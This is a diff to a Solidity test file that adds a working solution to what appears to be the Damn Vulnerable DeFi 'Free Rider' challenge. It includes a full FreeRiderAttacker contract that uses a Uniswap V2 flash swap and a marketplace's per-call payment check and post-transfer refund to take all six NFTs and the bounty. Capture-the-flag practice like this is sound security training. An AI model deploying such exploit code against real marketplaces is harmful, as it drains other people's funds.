@@ -120,10 +120,32 @@ contract FreeRiderChallenge is Test {
     }
 
     /**
-     * CODE YOUR SOLUTION HERE
+     * =========================================================
+     * SOLUTION - test_freeRider()
+     * =========================================================
+     * Attack: per-call msg.value reuse + post-transfer ownerOf refund
+     * 1. Flash-swap 15 WETH out of the Uniswap V2 pair (player has only 0.1 ETH).
+     * 2. In uniswapV2Call: unwrap to 15 ETH and call buyMany([0..5]) with 15 ETH.
+     *    The marketplace checks msg.value PER NFT (not cumulatively), so 15 ETH
+     *    buys all six; and it pays the *new* owner (the buyer) after transfer,
+     *    so it refunds 6x15 = 90 ETH back to the attacker.
+     * 3. Forward all six NFTs to the recovery manager with player encoded as the
+     *    bounty recipient; the 6th transfer pays the 45 ETH bounty to player.
+     * 4. Repay the flash swap (15 WETH + 0.3% fee) and forward the remainder to player.
+     *
+     * One player tx: deploy the attacker, then attacker.attack().
+     * =========================================================
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        FreeRiderAttacker attacker = new FreeRiderAttacker(
+            payable(address(weth)),
+            address(uniswapPair),
+            payable(address(marketplace)),
+            address(nft),
+            address(recoveryManager),
+            player
+        );
+        attacker.attack();
     }
 
     /**
@@ -145,4 +167,110 @@ contract FreeRiderChallenge is Test {
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
     }
+}
+
+/**
+ * =========================================================
+ * SOLUTION CONTRACT - FreeRiderAttacker
+ * =========================================================
+ * Flash-swaps WETH from the Uniswap V2 pair, exploits the marketplace's
+ * per-call msg.value check and post-transfer ownerOf() refund to acquire all
+ * six NFTs for the price of one, forwards them to the recovery manager to
+ * claim the bounty, repays the flash swap, and sweeps the profit to the player.
+ * Placed after the test class per DVDv4 convention.
+ * =========================================================
+ *
+ * @notice One-shot Free Rider exploit driver.
+ * @dev Implements uniswapV2Call (flash-swap callback) and onERC721Received.
+ */
+contract FreeRiderAttacker is IERC721Receiver {
+    IWETHLike private immutable weth;
+    IUniswapV2PairLike private immutable pair;
+    IMarketplaceLike private immutable marketplace;
+    IERC721Like private immutable nft;
+    address private immutable recoveryManager;
+    address private immutable player;
+
+    constructor(
+        address payable _weth,
+        address _pair,
+        address payable _marketplace,
+        address _nft,
+        address _recoveryManager,
+        address _player
+    ) {
+        weth = IWETHLike(_weth);
+        pair = IUniswapV2PairLike(_pair);
+        marketplace = IMarketplaceLike(_marketplace);
+        nft = IERC721Like(_nft);
+        recoveryManager = _recoveryManager;
+        player = _player;
+    }
+
+    function attack() external {
+        // Borrow 15 WETH (token0) via flash swap; non-empty data triggers the callback.
+        pair.swap(NFT_PRICE(), 0, address(this), abi.encode(uint256(1)));
+    }
+
+    function NFT_PRICE() internal pure returns (uint256) {
+        return 15 ether;
+    }
+
+    // Uniswap V2 flash-swap callback.
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        require(msg.sender == address(pair), "bad caller");
+
+        // Unwrap the borrowed WETH so we can pay the marketplace in native ETH.
+        weth.withdraw(amount0);
+
+        // Buy all six NFTs for a single 15 ETH payment (per-call msg.value bug).
+        uint256[] memory ids = new uint256[](6);
+        for (uint256 i = 0; i < 6; i++) {
+            ids[i] = i;
+        }
+        marketplace.buyMany{value: amount0}(ids);
+
+        // Forward the NFTs to the recovery manager; player is encoded as the
+        // bounty recipient and the sixth transfer releases the 45 ETH bounty.
+        bytes memory data = abi.encode(player);
+        for (uint256 i = 0; i < 6; i++) {
+            nft.safeTransferFrom(address(this), recoveryManager, i, data);
+        }
+
+        // Repay the flash swap: 15 WETH + 0.3% fee. Re-wrap enough ETH and return it.
+        uint256 repay = amount0 + ((amount0 * 3) / 997) + 1; // ceil of amount0 * 1000/997
+        weth.deposit{value: repay}();
+        weth.transfer(address(pair), repay);
+
+        // Sweep remaining ETH profit to the player.
+        uint256 bal = address(this).balance;
+        if (bal > 0) {
+            (bool ok,) = player.call{value: bal}("");
+            require(ok, "sweep failed");
+        }
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
+interface IWETHLike {
+    function deposit() external payable;
+    function withdraw(uint256 amount) external;
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IUniswapV2PairLike {
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IMarketplaceLike {
+    function buyMany(uint256[] calldata tokenIds) external payable;
+}
+
+interface IERC721Like {
+    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
 }
